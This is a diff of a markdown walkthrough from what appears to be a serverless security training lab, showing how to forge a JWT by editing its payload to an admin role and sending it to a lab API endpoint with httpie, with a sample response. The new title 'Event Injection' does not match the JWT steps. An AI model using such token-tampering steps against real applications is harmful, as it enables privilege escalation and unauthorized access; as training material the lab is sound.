@@ -1,63 +1,46 @@
-## 'none' Signed Token
-
-##### Step 1:
-
-* Open browser
-
-![](img/open-browser.png)
+# **Event Injection**
 
 
-##### Step 2:
+### *  *
 
-* open `http://sls-training-ui.s3-website-us-east-1.amazonaws.com/` to access the XML-Uploader application.
+-------
 
-![](img/login-page.png)
+#### Step 1:
 
+* Access the [XML-Uploader](http://sls-training-ui.s3-website-us-east-1.amazonaws.com/) Application on the browser.
 
-##### Step 3:
+```commandline
+http://sls-training-ui.s3-website-us-east-1.amazonaws.com/
+```
 
-* Using `email` and `password` login to the application.
+* Register and Login to the Application
 
-![](img/login-page.png)
-
-##### Step 4:
-
-* Click `Shift + f9` or right click on top of the browser and click on `Web Developer`,  select the `Storage Inspect` tab.
-
-![](img/local-storage.png)
-
-##### Step 5:
-
-* Click on `Local-Storage` icon on left, and expand.
-
-    * Copy the `token`
-    
-    ![](img/get_token.png)
-
-#### Step 6:
-
-* Open https://jwt.io/ and paste the token. Tamper the value in Payload section to 
+### *Note: The details provided CAN be fake and we highly recommend it!*
 
 
-    {
-    "username": "admin",
-    "role": "admin",
-    "email": "admin@widget.co"
-    }
+-------
 
+#### Step 2:
 
-![](img/tamper-jwt.png)
+* Once logged in, copy the value of `token` that can be found in `Local Storage` under the `Storage` section in `developer tools`
 
+* Paste the token on [jwt.io](https://jwt.io/) and tamper the value in `Payload` section
 
-##### Step 7:
+```commandline
+{
+"username": "admin",
+"role": "admin",
+"email": "admin@widget.co"
+}
+```
 
-* Open Terminal
+* Using the tampered token, try to access the application using `http` on the provisioned server
 
-![](img/Open-Terminal.png)
+```commandline
+http GET https://3u97ne6l2g.execute-api.us-east-1.amazonaws.com/latest/none Authorization:<token>
+```
 
-##### Step 8:
-
-* Run ` http GET https://3u97ne6l2g.execute-api.us-east-1.amazonaws.com/latest/none Authorization:<paste the copied token>`
+### *It should return with a response similar to the one below:*
 
 ```commandline
 root@we45-VirtualBox:/home/we45# http GET https://3u97ne6l2g.execute-api.us-east-1.amazonaws.com/latest/none Authorization:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiZW1haWwiOiJhZG1pbkB3aWRnZXQuY28ifQ.PSIL13J1t8Rrfd33fxgO2X3EaDaFQcsa0S3dAi07GLU
@@ -70,7 +53,7 @@ Access-Control-Max-Age: 0
 Connection: keep-alive
 Content-Length: 73
 Content-Type: application/json
-Date: Tue, 25 Sep 2018 16:32:05 GMT
+Date: Tue, 02 Apr 2019 16:32:05 GMT
 Via: 1.1 5bc1c4711561ec9e65e05f2ef18f000a.cloudfront.net (CloudFront)
 X-Amz-Cf-Id: yLaZex5YV7JTNFJoZrvlauQwCftBBi3Gpp2MP7rIAoGFd0MCIiBJ5g==
 X-Amzn-Trace-Id: Root=1-5baa6305-3c51c12dc7373ad2db05ab16;Sampled=1
@@ -86,3 +69,7 @@ x-amzn-RequestId: 8a1c7c11-c0e0-11e8-9e6d-b3dfa2e0c648
     }
 }
 ```
+
+---------
+
+### Reading Material/References:
